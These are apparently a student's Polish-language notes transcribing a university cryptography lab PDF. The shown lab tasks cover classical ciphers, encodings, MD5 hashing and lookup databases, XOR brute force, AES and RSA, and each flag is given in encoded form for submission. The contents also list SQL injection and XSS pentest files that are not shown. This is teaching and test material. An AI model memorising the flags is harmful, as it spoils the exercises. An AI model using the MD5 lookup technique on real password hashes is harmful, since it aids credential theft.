# Notatki z PDF - część 1/2

Wersja poprawiona: zdjęcia/obrazy stron zostały usunięte. Zostaje sama transkrypcja tekstu z PDF, żeby plik był lekki.

## Spis plików w tej części

1. [9. Kryptografia (3)(1).pdf](#9-kryptografia-3-1-pdf) - 41 stron
2. [9p. Kryptografia PENTEST (1)(1).pdf](#9p-kryptografia-pentest-1-1-pdf) - 22 stron
3. [10. SQL Injection (2)(2).pdf](#10-sql-injection-2-2-pdf) - 42 stron
4. [10p. SQL Injection PENTEST (2)(2).pdf](#10p-sql-injection-pentest-2-2-pdf) - 14 stron
5. [11. Błędy Cross-site Scripting (1)(2).pdf](#11-błędy-cross-site-scripting-1-2-pdf) - 60 stron
6. [11p. Błędy Cross-site Scripting PENTEST (1)(2).pdf](#11p-błędy-cross-site-scripting-pentest-1-2-pdf) - 16 stron

---

## 1. 9. Kryptografia (3)(1).pdf

Liczba stron: 41


### Strona 1 / 41

#### Tekst

```text
                   KRYPTOGRAFIA                                                                                                                                                             PJA.EDU.PL
      Kryptografia


                        KOMPUTEROWYCH                          Zajęcia nr 9
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
                                                                                         Powered by HackingDept platform
s32924 2026-06-20 01:41:34
```

### Strona 2 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Spis treści


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ŚRODOWISKOUruchamianiePołączenieZADANIA9.19.29.39.49.59.69.79.89.99.10KryptografiaZapisTabelaInneDaneFunkcjeBazaOperacjaAlgorytmAlgorytmSposobyMD5HeksadecymalnyBinarneASCIIOpenVPNSkrótuXORAESMaszyn……………………….…..……..RSAKlasyczna…………………..………….……………………………..Zapisu…………………….……….………………….………….…………………………………………….………….……………………….……………………..…………………..………………..……..…………
                              ŚRODOWISKO
                                                            Uruchamianie Maszyn ……………………..  8
                                                                Połączenie OpenVPN ……………………….  9
                                 ZADANIA
                                                                9.1 Kryptografia Klasyczna ……………….. 11
                                                                9.2 Zapis Heksadecymalny ……..………… 13
                                                                9.3 Tabela ASCII …………………..…………. 15
                                                                9.4 Inne Sposoby Zapisu ………………….. 17
                                                                9.5 Dane Binarne …………………………….. 19
                                                                9.6 Funkcje Skrótu …………………………… 21
                                                                9.7 Baza MD5 ……………………….…..…….. 23
                                                                9.8 Operacja XOR ………………….…………. 25
                                                                9.9 Algorytm AES …………………….………. 33
                                                             9.10 Algorytm RSA ……………….…………. 36


                                                                                                                                                                                                            2
s32924 2026-06-20 01:41:34
```

### Strona 3 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Wstęp
  Student  pozna  podstawy   historii  kryptografii,  nauczy  się  idei  szyfrów
  podstawieniowych   i  przestawieniowych   i  funkcji  skrótu.  Następnie  pozna
  współczesne metody symetrycznego (AES) i asymetrycznego (RSA) szyfrowania
  danych oraz zapozna się z podstawowymi błędami, których należy unikać przy ich
  stosowaniu.


                                                                                                                                                                                                            3
s32924 2026-06-20 01:41:34
```

### Strona 4 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Historia
  Kryptografia  ma   swoje    korzenie  w    starożytności,    gdzie    była
  stosowana do  zabezpieczania  komunikacji. Jednym  z  najbardziej  znanych
  przykładów jest szyfr Cezara, używany przez Juliusza Cezara do szyfrowania
  wiadomości. Polegał on na przesunięciu każdej litery alfabetu o ustaloną liczbę
  miejsc. W średniowieczu rozwinięto bardziej skomplikowane metody szyfrowania,
  takie jak szyfr polialfabetyczny Vigenère'a, który był trudniejszy do złamania.


                                                                                                                                                                                                            4
s32924 2026-06-20 01:41:34
```

### Strona 5 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Historia
 W  epoce  renesansu   kryptografia   stała   się   bardziej  zaawansowana,
  a  zainteresowanie  nią  wzrosło,  zwłaszcza w  kontekście  polityki   i  wojny.
  Jednak prawdziwy przełom nastąpił w XIX wieku wraz z rozwojem telegrafu
   i pierwszych mechanicznych urządzeń szyfrujących. W czasie I wojny światowej
  używano maszyn szyfrujących, takich jak niemiecka maszyna ADFGVX.


                                                                                                                                                                                                            5
s32924 2026-06-20 01:41:34
```

### Strona 6 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Historia
  II wojna światowa przyniosła rewolucję w  kryptografii, szczególnie  dzięki
 maszynie Enigma, używanej przez Niemców. Złamanie szyfru Enigmy przez
  alianckich kryptologów, w tym polskich  i brytyjskich, miało ogromny wpływ
 na wynik  wojny. Prace Alana  Turinga   i  jego  zespołu w  Bletchley Park
  doprowadziły do powstania pierwszych komputerów, co zapoczątkowało nową
  erę w kryptografii i technologii informacyjnej.


                                                                                                                                                                                                            6
s32924 2026-06-20 01:41:34
```

### Strona 7 / 41

#### Tekst

```text
                   KRYPTOGRAFIA                                                                                                                                                             PJA.EDU.PL


       Przygotowanie
         środowiska                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-20 01:41:34
```

### Strona 8 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Uruchamianie maszyn
  Przed rozpoczęciem upewnij się, że maszyna Crypto jest włączona.
  Jeżeli  coś  się  zepsuje, w  każdej  chwili możesz  ją  przywrócić do  stanu
  początkowego.


                                                                                                                                                                                                            8
s32924 2026-06-20 01:41:34
```

### Strona 9 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Połączenie OpenVPN


  Połączenie OpenVPN jest niezbędne do rozwiązania zadań.
  Aby połączyć się z siecią VPN, należy pobrać  plik konfiguracyjny OpenVPN
  z rozwijanego menu „VPNy” na stronie głównej.
  Następnie należy wykonać komendę:

  sudo openvpn /sciezka/do/pliku.ovpn

  Uwaga!  Wszystkie  zadania  z  tego dokumentu  znajdują  się  na  maszynie
  „WSZYSTKIE ZADANIA”, a uzyskane flagi należy wkleić w formularzu na stronie.
                                                                                                                                                                                                            9
s32924 2026-06-20 01:41:34
```

### Strona 10 / 41

#### Tekst

```text
                   KRYPTOGRAFIA                                                                                                                                                             PJA.EDU.PL


                    PJA.EDU.PL
          Zadania
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-20 01:41:34
```

### Strona 11 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.1: Kryptografia klasyczna

  Szyfry  podstawieniowe   i  przestawieniowe  to dwa  różne  podejścia do
  szyfrowania informacji, różniące się sposobem manipulacji tekstem jawnym.
  Szyfr podstawieniowy polega na zastępowaniu każdej litery lub grupy liter
 w tekście jawnym inną literą lub grupą liter zgodnie z określonym kluczem.
  Przykładem jest szyfr Cezara, w którym każda litera w tekście jawnym jest
  przesunięta o  określoną  liczbę  miejsc w  alfabecie. Na  przykład,  przy
  przesunięciu o trzy miejsca, litera "A" staje się "D", "B" staje się "E", itd. Tekst
  jawny "ABC" po zaszyfrowaniu staje się "DEF".
  Szyfr przestawieniowy, z kolei, nie zmienia liter, ale zmienia ich kolejność
 w tekście jawnym.


                                                                                                                                                                                                           11
s32924 2026-06-20 01:41:34
```

### Strona 12 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.1: Kryptografia klasyczna
 Choć obecnie podobne metody szyfrowania nie są stosowane w sytuacjach, gdzie
  bezpieczeństwo danych  jest kluczowe, a nadają się raczej do gier  i zabaw,
  to „na rozgrzewkę” zaczniemy od złamania podobnego szyfru. W tym zadaniu
  użyliśmy szyfru AtBash.
  Szyfr  AtBash  to  starożytny  szyfr  podstawieniowy, w  którym  alfabet  jest
  odwrócony, tzn. każda litera jest zastępowana swoją odpowiedniczką z końca
  alfabetu (A staje się Z, B staje się Y, itd.). Był używany przez Hebrajczyków,
  a jego prostota sprawia, że jest bardziej ciekawostką historyczną niż skutecznym
  narzędziem kryptograficznym.
  Zdekoduj zapisaną flagę, a następnie wpisz w formularzu:


  KQZGP{GlWlkrvilKlxazgvp}


                                                                                                                                                                                                           12
s32924 2026-06-20 01:41:34
```

### Strona 13 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.2: Zapis heksadecymalny
 Ponieważ będziemy posługiwać się danymi binarnymi, musimy je umieć jakoś
  zapisać. Jednym ze sposobów zapisu danych binarnych jest zapis heksadecymalny
 (zwany również szesnastkowym). Należy zwrócić uwagę na  różnicę między
 zapisem heksadecymalnym liczb, a danych binarnych. Na przykład liczba 1000,
 może zostać zapisana jako 0x3e8.
 Dane binarne to z kolei ciągi bajtów, zapis d38c9ba6af7fa8bb oznacza więc ciąg
 8 bajtów o wartościach kolejno: 211 (0xd3), 140 (0x8c), 155 (0x9b), 166 (0xa6),
 175 (0xaf), 127 (0x7f), 168 (0xa8), 187 (0xbb).
 Czasem zapisujac liczby w systemie heksadecymalnym pomija się prefix “0x”.
  Należy z kontekstu wywnioskować, czy chodzi o liczbę, czy dane binarne.


                                                                                                                                                                                                           13
s32924 2026-06-20 01:41:34
```

### Strona 14 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.2: Zapis heksadecymalny
 W zapisie danych binarnych zazwyczaj poszczególne bajty oddziela się, co znacznie
  ułatwia  ich  czytanie.  Np.  zamiast  pisać  4fdc2d3746b412d222d2ffd61442,
 możemy napisać 4f dc 2d 37 46 b4 12 d2 22 d2 ff d6 14 42. Czasem grupuje się
  też bajty w pary: 4fdc 2d37 46b4 12d2 22d2 ffd6 1442.


  Zapisaliśmy  flagę  właśnie w  tej  postaci.  Zdekoduj  ją, a  następnie  wpisz
 w formularzu:
 50 4A 41 54 4B 7B 73 7A 65 73 6E 61 73 63 69 65 7D
 Możesz użyć do tego celu jednego z licznych narzędzi online, a nawet wiersza
  poleceń systemu Linux! Np.:
  echo 50 4A 41 54 4B 7B 73 7A 65 73 6E 61 73 63 69 65 7D | xxd -r -p ; echo


                                                                                                                                                                                                           14
s32924 2026-06-20 01:41:34
```

### Strona 15 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.3: Tabela ASCII
  ASCII  (czyt.  aski,  skrót od  ang. American Standard Code  for Information
  Interchange) - siedmiobitowy system kodowania znaków, używany
 we współczesnych komputerach oraz sieciach komputerowych, a także innych
  urządzeniach  wyposażonych w  mikroprocesor.  Przyporządkowuje  liczbom
  z zakresu 0-127:  litery alfabetu łacińskiego języka angielskiego, cyfry, znaki
  przestankowe i inne symbole oraz polecenia sterujące.


  Pełną tabelę możesz odnaleźć tutaj: https://www.asciitable.com/ .


                                                                                                                                                                                                           15
s32924 2026-06-20 01:41:34
```

### Strona 16 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.3: Tabela ASCII
 Tym razem zapisaliśmy flagę za pomocą kodów ASCII. Zdekoduj ją  i wpisz
 w formularzu na stronie.
 80 74 65 84 75 123 116 64 98 101 108 64 122 110 97 75 111 119 125
  Możesz użyć do tego celu jednego z licznych narzędzi online, albo dekodować
  znaki ręcznie.


                                                                                                                                                                                                           16
s32924 2026-06-20 01:41:34
```

### Strona 17 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.4: Inne sposoby zapisu danych

 O pozostałych, choć niemniej ważnych metodach zapisu danych wspomnimy
  łącznie.
  1. Base64 - jest to metoda zapisu danych, która pozwala m.in. na przesyłanie
    danych binarnych w formie tekstowej. PJATK w base64 to UEpBVEs=
  2. Urlencode - mechanizm kodowania informacji w URI, obecnie definiowany
   w RFC3986. Głównie jest używane do kodowania danych przesyłanych przez
     zapytanie GET w adresie URL. Kodowane są tylko niektóre znaki (na przykład
     spacja, „_”, „&”)
  3. Encje HTML - Sposób zapisu niektórych znaków używanych głównie jako
    element języka HTML. Istnieją encje nazwane, dziesiętne  i szestanstkowe.
    Symbol "<" można zapisać jako &lt;, &#60; lub &#x3c;. Pełną listę można
     znaleźć tutaj: https://www.w3schools.com/html/html_entities.asp .

                                                                                                                                                                                                           17
s32924 2026-06-20 01:41:34
```

### Strona 18 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.4: Inne sposoby zapisu danych
 W tym zadaniu zakodowaliśmy flagę za pomocą base64. Zdekoduj ją  i wklej
 w formularzu na stronie:
 UEpBVEt7YTExeW91cmJhc2V9
 Możesz użyć jednego z licznych dekoderów online, a nawet wiersza poleceń
  systemu Linux:
 echo UEpBVEt7YTExeW91cmJhc2V9 | base64 --decode


                                                                                                                                                                                                           18
s32924 2026-06-20 01:41:34
```

### Strona 19 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.5: Wyświetlanie danych binarnych

 Celem zadania jest wyświetlenie na konsoli zawartości pliku hex.bin w zapisie
  heksadecymalnym. Plik ten znajduje się już na maszynie testowej.
 Może  nas  kusić  użycie podstawowej komendy  cat,  służy ona  jednak do
  wyświetlania danych tekstowych (spróbuj wywołać cat hex.bin  i zobacz efekt).
 Do wyświetlenia danych binarnych można użyć np. komendy xxd:
 xxd hex.bin
  Zadanie zostanie zaliczone po wykonaniu powyższej komendy.


                                                                                                                                                                                                           19
s32924 2026-06-20 01:41:34
```

### Strona 20 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.5: Wyświetlanie danych binarnych
 Komenda  xxd  domyślnie  wyświetla  dane
  binarne wypisując 16 bajtów w każdej linii.
 W pierwszej kolumnie znajduje  się pozycja
 w pliku aktualnej linii. Pozycja pliku jest liczbą
  zapisaną heksadecymalnie.
 W  ostatniej  kolumnie  znajduje  się  zapis
  tekstowy w formacie ASCII, w którym bajty
  spoza zakresu ASCII oraz znaki niedrukowalne
  zostały zastąpione kropkami.


                                                                                                                                                                                                           20
s32924 2026-06-20 01:41:34
```

### Strona 21 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.6: Funkcje skrótu
  Funkcje skrótu to algorytmy kryptograficzne, które przekształcają dowolnie długie
 dane wejściowe w unikalny ciąg o stałej długości, zwany skrótem (hash). Ich cechą
  charakterystyczną jest to, że nawet minimalna zmiana w danych wejściowych
 powoduje  znaczną  zmianę  wyniku,  co  uniemożliwia  przewidzenie  skrótu
 na podstawie oryginalnych danych. Funkcje skrótu są kluczowe w zabezpieczaniu
  danych, stosowane m.in. w podpisach cyfrowych, weryfikacji integralności plików
  oraz przechowywaniu haseł. Przykładami popularnych funkcji skrótu są MD5,
 SHA-1 oraz rodzina algorytmów SHA-2 (np. SHA-256).


                                                                                                                                                                                                           21
s32924 2026-06-20 01:41:34
```

### Strona 22 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.6: Funkcje skrótu
 W tym zadaniu naszym celem będzie obliczenie wartości hashu MD5 dla „PJATK”.
  Możesz użyć do tego celu jednego z licznych narzędzi online, a nawet wiersza
  poleceń systemu Linux! Na przykład:
  echo -n PJATK | md5sum


                                                                                                                                                                                                           22
s32924 2026-06-20 01:41:34
```

### Strona 23 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.7: Baza MD5
 O ile sam algorytm MD5 jest nieodwracalny, tak istnieją olbrzymie bazy danych,
  które przechowują już przeliczone hashe, co pozwala na odzyskanie danych
  zapisanych w ten sposób.
  Bazy danych MD5 są często wykorzystywane w atakach, gdzie można spróbować
  odwrócić proces haszowania, aby odzyskać oryginalne hasła. Ze względu na słabe
  zabezpieczenia, MD5 jest uważany za przestarzały i niewystarczający do ochrony
  danych w nowoczesnych systemach,  gdzie  zaleca  się stosowanie  bardziej
  zaawansowanych funkcji skrótu, takich jak SHA-256.


  Przykładowa baza danych: https://md5decrypt.net/en/


                                                                                                                                                                                                           23
s32924 2026-06-20 01:41:34
```

### Strona 24 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.7: Baza MD5
  Wykorzystamy jedną  z  takich  baz, aby dowiedzieć  się,  jakie dane  zostały
  przekształcone za pomocą MD5.
  Używając wybranej bazy (może będzie trzeba sprawdzić  kilka?) znajdź flagę
 zakodowaną jako: 3062e1e11c64939824f4f249890f7157
 Odpowiedź podaj w formie: PJATK{flaga} w formularzu.


                                                                                                                                                                                                           24
s32924 2026-06-20 01:41:34
```

### Strona 25 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.8: Operacja XOR
  Operacja XOR (exclusive OR) to operacja logiczna, która działa na dwóch bitach
   i zwraca 1, jeśli dokładnie jeden z bitów jest równy 1, a drugi 0; w przeciwnym
  razie zwraca 0. W edukacji szkolnej uczniowie poznają podstawowe operacje
  logiczne, takie jak AND, OR, NOT, a XOR jest kolejną z nich, specyficzną w swoim
  działaniu.


                                                                                                                                                                                                           25
s32924 2026-06-20 01:41:34
```

### Strona 26 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.8: Operacja XOR
  Własności matematyczne XOR:
  A XOR 0 = A
  A XOR A = 0
  (A XOR B) XOR B = A
  A XOR B = B XOR A
 A XOR B = (A AND NOT B) OR (NOT A AND B)


  Te własności czynią XOR przydatnym w szyfrowaniu, gdzie szyfrowanie można
  łatwo odwrócić, ale tylko jeśli zna się oryginalny klucz.


                                                                                                                                                                                                           26
s32924 2026-06-20 01:41:34
```

### Strona 27 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.8: Operacja XOR
 Spróbujmy zaszyfrować przy pomocy operacji XOR skrót PJATK za pomocą klucza
  abc. W tym celu zapisujemy zarówno PJATK jak i abc w postaci binarnej:
  P: 01010000
  J: 01001010
  A: 01000001
  T: 01010100
  K: 01001011


  a: 01100001
  b: 01100010
  c: 01100011


                                                                                                                                                                                                           27
s32924 2026-06-20 01:41:34
```

### Strona 28 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.8: Operacja XOR
  Teraz kolejno wykonujemy operacje (klucz powtarzamy cyklicznie, aby znaków
  było tyle samo, co w szyfrowanej wiadomości):
 P (01010000) XOR a (01100001) = 00110001
  J (01001010) XOR b (01100010) = 00101000
 A (01000001) XOR c (01100011) = 00100010
  T (01010100) XOR a (01100001) = 00110101
 K (01001011) XOR b (01100010) = 00101001


                                                                                                                                                                                                           28
s32924 2026-06-20 01:41:34
```

### Strona 29 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.8: Operacja XOR
 Wynikowe wartości binarne ponownie zapisujemy jako znaki ASCII:
 00110001 (1)
 00101000 (()
 00100010 (")
 00110101 (5)
 00101001 ())
 Po  wykonaniu  operacji XOR  z  kluczem  "abc",  hasło  "PJATK"  zostało
  zaszyfrowane do  ciągu  binarnego,  który odpowiada znakom  "1("5)". Aby
  odzyskać oryginalne hasło, należy ponownie zastosować operację XOR z tym
 samym kluczem.


                                                                                                                                                                                                           29
s32924 2026-06-20 01:41:34
```

### Strona 30 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.8: Operacja XOR
  Istnieje tylko 256 jednobajtowych kluczy XOR (jest 8 bitów w bajcie, a 2 do potęgi 8
  to 256), więc możemy sprawdzić wszystkie. Wykorzystamy w tym celu narzędzie
  CyberChef: https://cyberchef.org/ .


                                                                                                                                                                                                           30
s32924 2026-06-20 01:41:34
```

### Strona 31 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.8: Operacja XOR
  Celem zadania jest zdekodowanie podanego niżej ciągu znaków, który został
  zaszyfrowany za pomocą jednobajtowego klucza przy pomocy algorytmu XOR.
  Odpowiednia konfiguracja narzędzia CyberChef  jest widoczna na następnym
  slajdzie.
  Ciąg do zdekodowania:
  08 12 19 0C 13 23 20 37 2A 36 31 3D 32 3D 2B 2C 3A 3D 22 28 31 3D 3B 22 36 21 25


  Dla jednego z kluczy powinieneś otrzymać flagę. Którego? To już musisz sprawdzić
  samodzielnie. Odpowiedź podaj w formularzu.


                                                                                                                                                                                                           31
s32924 2026-06-20 01:41:34
```

### Strona 32 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.8: Operacja XOR


                                                                                                                                                                                                           32
s32924 2026-06-20 01:41:34
```

### Strona 33 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.9: Algorytm AES
 AES jest blokowym algorytmem szyfrowania symetrycznego. Wykorzystując
  go możemy zaszyfrować dane przy pomocy hasła. Zaszyfrowane dane możemy
  nawet opublikować w internecie, ale bez znajomości hasła nikt nie będzie w stanie
  odczytać niezaszyfrowanej zawartości. Jedyną możliwością odczytania zawartości
  jest  poznanie,  bądź  zgadnięcie,  hasła.  AES  wykonuje  różne  operacje
  matematyczne, takie jak zamiana miejscami, mieszanie, i podstawianie elementów
 w każdym bloku.


                                                                                                                                                                                                           33
s32924 2026-06-20 01:41:34
```

### Strona 34 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.9: Algorytm AES
  Algorytm AES może występować w wielu trybach. Z oczywistych powodów
  nie będziemy tu omawiać różnic, jednak przynajmniej pokażmy, ile ich jest:


              -aes-128-cbc    -aes-128-cfb     -aes-128-cfb8    -aes-128-ctr    -aes-128-ecb
              -aes-128-ofb     -aes-192-cbc    -aes-192-cfb     -aes-192-cfb1  -aes-192-cfb8
               -aes-192-ctr     -aes-192-ecb    -aes-192-ofb     -aes-256-cbc   -aes-256-cfb
              -aes-256-cfb1    -aes-256-cfb8    -aes-256-ctr     -aes-256-ecb   -aes-256-ofb
              -aes128-(wrap)  -aes192-(wrap)  -aes256-(wrap)


                                                                                                                                                                                                           34
s32924 2026-06-20 01:41:34
```

### Strona 35 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.9: Algorytm AES
  Celem zadania jest odszyfrowanie pliku plik_enc_aes-256-cbc.bin
  zaszyfrowanego hasłem z wykorzystaniem AES. Plik ten znajduje się na maszynie
  wirtualnej studenta. Aby dostać się na maszynę należy zalogować się po ssh:

  Hasło brzmi PJATK.
 W celu odszyfrowania pliku należy wykonać komendę:
  openssl aes-256-cbc -pbkdf2 -d -in plik_enc_aes-256-cbc.bin
  Zdobytą w tej sposób flagę wklej w formularzu na stronie.


                                                                                                                                                                                                           35
s32924 2026-06-20 01:41:34
```

### Strona 36 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.10: Algorytm RSA
 Podobnie jak AES, RSA jest algorytmem szyfrowania. W przeciwieństwie
 do AES, RSA służy do szyfrowania asymetrycznego, często system RSA
  określa się mianem kryptografii klucza publicznego.
 W RSA wykorzystuje się klucze,  czyli specjalne  pliki. Aby móc coś
  zaszyfrować, należy w pierwszej kolejności wygenerować losowy klucz
  prywatny.  Kluczem  prywatnym  można  dane  odszyfrować.  Takie
  wykorzystanie RSA nie różni się od AES.
  Istotna cześć RSA leży w możliwości wygenerowania klucza publicznego
  związanego z zadanym kluczem prywatnym. Kluczem publicznym można
 dane zaszyfrować, ale nie da się nim odszyfrowywać danych. Mimo to,
 dane   zaszyfrowane   kluczem   publicznym  można   odszyfrować
  wykorzystując klucz prywatny sparowany z kluczem publicznym.


                                                                                                                                                                                                           36
s32924 2026-06-20 01:41:34
```

### Strona 37 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.10: Algorytm RSA
 RSA wykorzystuje się np. do szyfrowania e-maili. Właściciel adresu email może
  udostępnić innym swój klucz publiczny. Dzięki temu, pisząc maila do tej osoby,
 możemy  zaszyfrować  treść  wiadomości  przy pomocy  klucza  publicznego.
 Do odszyfrowania wiadomości potrzebny jest klucz prywatny sparowany z kluczem
  publicznym, a więc tylko właściciel adresu e-mail będzie w stanie odszyfrować
    i odczytać tę wiadomość.


                                                                                                                                                                                                           37
s32924 2026-06-20 01:41:34
```

### Strona 38 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.10: Algorytm RSA

 Celem zadania jest wygenerowanie pary kluczy RSA i użycie ich do zaszyfrowania
  pliku plik2.txt. Plik znajduje się na maszynie wirtualnej studenta.
  Generacja klucza prywatnego:
  openssl genrsa -out rsa_key 3072
  Generacja klucza publicznego sparowanego z kluczem prywatnym:
  openssl rsa -in rsa_key -pubout -out rsa_key.pub
  Szyfrowanie:
  openssl pkeyutl -encrypt -in plik2.txt -pubin -inkey rsa_key.pub -out plik2.bin


                                                                                                                                                                                                           38
s32924 2026-06-20 01:41:34
```

### Strona 39 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 9.10: Algorytm RSA
 GPG (GNU Privacy Guard) to narzędzie do szyfrowania  i podpisywania danych,
  które  jest oparte na standardzie OpenPGP.  Działa na zasadzie  kryptografii
  asymetrycznej, co oznacza, że używa pary kluczy: publicznego, który może być
  udostępniany innym,  i prywatnego, który jest znany tylko właścicielowi. Klucz
  publiczny służy do szyfrowania wiadomości, które może odszyfrować jedynie
  właściciel odpowiadającego mu  klucza  prywatnego. GPG  jest powszechnie
  stosowane do bezpiecznej komunikacji i zapewnienia autentyczności dokumentów
  poprzez cyfrowe podpisy.


                                                                                                                                                                                                           39
s32924 2026-06-20 01:41:34
```

### Strona 40 / 41

#### Tekst

```text
                    KRYPTOGRAFIA                                                                          POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PLPJA.EDU.PL

 Referencje
  http://ekryptografia.pl/kryptografia/szyfry-klasyczne/
  szyfry klasyczne

  https://www.cs.bu.edu/~goldbe/teaching/HW55814/static/pymd5.py
  algorytm md5 zapisany w języku Python

  https://cyberwiedza.pl/funkcja-skrotu-kryptograficznego/
  informacje o funkcjach skrótu

  https://www.geeksforgeeks.org/difference-between-aes-and-des-ciphers/
  różnice pomiędzy AES, a DES


                                                                                                                                                                                                           4040
s32924 2026-06-20 01:41:34
```

### Strona 41 / 41

#### Tekst

```text
